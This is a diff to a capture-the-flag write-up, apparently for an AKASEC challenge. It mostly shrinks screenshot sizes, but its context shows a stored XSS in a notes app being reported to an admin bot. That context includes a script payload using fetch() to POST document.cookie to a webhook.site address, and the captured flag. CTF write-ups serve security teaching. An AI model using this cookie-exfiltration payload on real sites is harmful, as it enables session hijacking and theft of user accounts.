@@ -6,13 +6,13 @@
 
 <strong>challenge discription</strong>
 
-<img src='./assets/1.png' style="max-width:50%">
+<img src='./assets/1.png' style="max-width:40%">
 
 
 
 <h3>visiting the challenge on browser</h3>
 
-<img src='./assets/2.png' style="max-width:50%">
+<img src='./assets/2.png' style="max-width:40%">
 
 <h3>Let's check the source code</h3>
 
@@ -79,18 +79,18 @@ Hmm Let's try some <strong>XSS</strong>
 </h3>
 
 <br/>
-<img src='./assets/3.png' style="max-width:50%">
+<img src='./assets/3.png' style="max-width:40%">
 <br/>
 <br/>
 
 <h3>Let's save the Note and visite the click on the link</h3>
 <br/>
 
-<img src='./assets/4.png' style="max-width:50%">
+<img src='./assets/4.png' style="max-width:40%">
 
 <h3>It works and there's also a button <strong>share with admin</strong></h3>
 
-<img src='./assets/5.png' style="max-width:50%">
+<img src='./assets/5.png' style="max-width:40%">
 
 <h3>
 Let's check the source code again to see how <strong>/report</strong> indpoint works 
@@ -154,7 +154,7 @@ and then visits the url passed passed as argument which is the our Note url<br/>
 <h3>So we can pass a payload to read the <strong>cookie</strong> and send it to us using http request.</h3>
 <h3>First I let's open a <strong>webhook</strong>  that will start listning on our request</h3>
 
-<img src='./assets/6.png' style="max-width:50%">
+<img src='./assets/6.png' style="max-width:40%">
 
 <h3>let's put our payload in a note and <strong>report it to admin</strong></h3>
 
@@ -166,20 +166,20 @@ fetch('https://webhook.site/00dab9f6-07c5-4a73-902f-ebc4f97a7eb6', {method: "POS
 fetch('https://webhook.site/00dab9f6-07c5-4a73-902f-ebc4f97a7eb6', {method: "POST", body: document.cookie})
 </script>
 ```
-<img src='./assets/7.png' style="max-width:50%">
+<img src='./assets/7.png' style="max-width:40%">
 <br/>
 <h3>Save the note and visit it's link you should reseve first post<br/>request in your webhook when the xss executed in your client-side</h3>
 <br/>
-<img src='./assets/8.png' style="max-width:50%">
+<img src='./assets/8.png' style="max-width:40%">
 <br/>
 <br/>
-<img src='./assets/9.png' style="max-width:50%">
+<img src='./assets/9.png' style="max-width:40%">
 
 
 <h3>Now let's make admin visit the note by clicking on <strong>share with admin</strong> button</h3>
 
 
-<img src='./assets/10.png' style="max-width:50%">
+<img src='./assets/10.png' style="max-width:40%">
 <h3>and as you can see we recieved our flag</h3>
 <hr/>
 <h2>The flag <strong>AKASEC{GooD_0LD_BX55}</strong></h2>
